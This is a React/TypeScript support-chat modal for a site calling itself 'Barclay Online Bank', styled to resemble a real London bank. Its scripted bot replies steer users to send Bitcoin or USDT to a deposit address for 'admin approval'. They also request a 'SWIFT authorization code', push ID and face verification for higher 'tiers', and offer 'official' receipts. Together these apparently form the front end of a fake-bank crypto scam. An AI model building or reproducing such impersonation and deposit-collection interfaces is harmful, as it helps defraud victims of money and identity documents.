import React, { useState } from 'react';
import { 
  X, 
  Headphones, 
  Send, 
  MessageSquare, 
  Phone, 
  Mail, 
  Building2, 
  ShieldCheck, 
  Lock,
  CheckCircle2
} from 'lucide-react';

interface SupportModalProps {
  isOpen: boolean;
  onClose: () => void;
  userName?: string;
  accountNumber?: string;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text: string;
  time: string;
}

export const SupportModal: React.FC<SupportModalProps> = ({
  isOpen,
  onClose,
  userName = 'Valued Client',
  accountNumber
}) => {
  const [messages, setMessages] = useState<Message[]>([
    {
      id: '1',
      sender: 'bot',
      text: `Hello ${userName}, welcome to Barclay Online Bank Priority Private Support. How can our London desk assist your accounts or international wire settlements today?`,
      time: 'Just now'
    }
  ]);
  const [inputText, setInputText] = useState('');

  if (!isOpen) return null;

  const handleSendMessage = (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputText.trim()) return;

    const userMsg: Message = {
      id: Date.now().toString(),
      sender: 'user',
      text: inputText.trim(),
      time: 'Just now'
    };

    setMessages(prev => [...prev, userMsg]);
    const query = inputText.toLowerCase();
    setInputText('');

    setTimeout(() => {
      let reply = "Your inquiry has been logged with Barclay Client Services. For urgent SWIFT authorization or wire release, an administrative officer is reviewing pending requests.";
      if (query.includes('deposit') || query.includes('crypto') || query.includes('bitcoin') || query.includes('usdt')) {
        reply = "For cryptocurrency deposits, please navigate to 'Deposit', copy the official Bitcoin or USDT ERC-20 address, and submit your transaction hash via 'I Have Made the Payment' for rapid admin approval.";
      } else if (query.includes('swift') || query.includes('transfer') || query.includes('code')) {
        reply = "International transfers require your 4-digit SWIFT authorization code. Once submitted, your transfer is marked as 'Pending' and will execute immediately upon administrator confirmation.";
      } else if (query.includes('tier') || query.includes('upgrade') || query.includes('limit')) {
        reply = "Tier 2 provides a $50,000 daily limit ($5,000,000 monthly) via facial verification. Tier 3 unlocks VIP Elite limits with government ID verification. Submissions are reviewed directly by compliance officers.";
      } else if (query.includes('receipt')) {
        reply = "You can view and print official Barclay Online Bank Transfer Advice receipts at any time by clicking any transaction in your Transaction History.";
      }

      const botReply: Message = {
        id: (Date.now() + 1).toString(),
        sender: 'bot',
        text: reply,
        time: 'Just now'
      };
      setMessages(prev => [...prev, botReply]);
    }, 700);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-lg bg-[#00172e] border border-[#003866] rounded-2xl shadow-2xl overflow-hidden text-white flex flex-col h-[580px]">
        
        {/* Header */}
        <div className="px-6 py-4 border-b border-[#002b52] flex items-center justify-between bg-[#001428]">
          <div className="flex items-center gap-3">
            <div className="bg-white/95 px-2 py-1 rounded-xl shadow-md border border-cyan-400/40">
              <img
                src="/logo.png"
                alt="Barclay Online Bank"
                className="h-9 w-auto object-contain select-none"
              />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="text-sm font-extrabold text-white">Barclay Online Client Support</h3>
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
              </div>
              <p className="text-[10px] text-slate-400">Canary Wharf Global Desk • 256-Bit Encrypted</p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-[#002850] transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Support Channels Banner */}
        <div className="px-6 py-2 bg-[#001b36] border-b border-[#002d57] grid grid-cols-2 gap-2 text-[11px] text-slate-300">
          <div className="flex items-center gap-1.5">
            <Phone className="w-3.5 h-3.5 text-cyan-400" />
            <span>UK Hotline: +44 20 7116 1000</span>
          </div>
          <div className="flex items-center gap-1.5">
            <Mail className="w-3.5 h-3.5 text-cyan-400" />
            <span>priority@barclay.bank</span>
          </div>
        </div>

        {/* Chat History */}
        <div className="flex-1 p-4 overflow-y-auto space-y-3 bg-[#001224]">
          {messages.map(m => (
            <div
              key={m.id}
              className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}
            >
              <div
                className={`max-w-[85%] rounded-2xl px-4 py-2.5 text-xs ${
                  m.sender === 'user'
                    ? 'bg-cyan-600 text-white rounded-br-none shadow-md'
                    : 'bg-[#002244] border border-[#003866] text-slate-200 rounded-bl-none'
                }`}
              >
                <p className="leading-relaxed">{m.text}</p>
                <span className={`text-[9px] block text-right mt-1 ${m.sender === 'user' ? 'text-cyan-200' : 'text-slate-400'}`}>
                  {m.time}
                </span>
              </div>
            </div>
          ))}
        </div>

        {/* Input Bar */}
        <form onSubmit={handleSendMessage} className="p-3 border-t border-[#002b52] bg-[#00172e] flex items-center gap-2">
          <input
            type="text"
            value={inputText}
            onChange={(e) => setInputText(e.target.value)}
            placeholder="Type your banking or transfer question..."
            className="flex-1 bg-[#002040] border border-[#003866] rounded-xl px-4 py-2 text-xs text-white placeholder-slate-400 focus:outline-none focus:border-cyan-400"
          />
          <button
            type="submit"
            className="p-2.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold transition-colors"
          >
            <Send className="w-4 h-4" />
          </button>
        </form>
      </div>
    </div>
  );
};
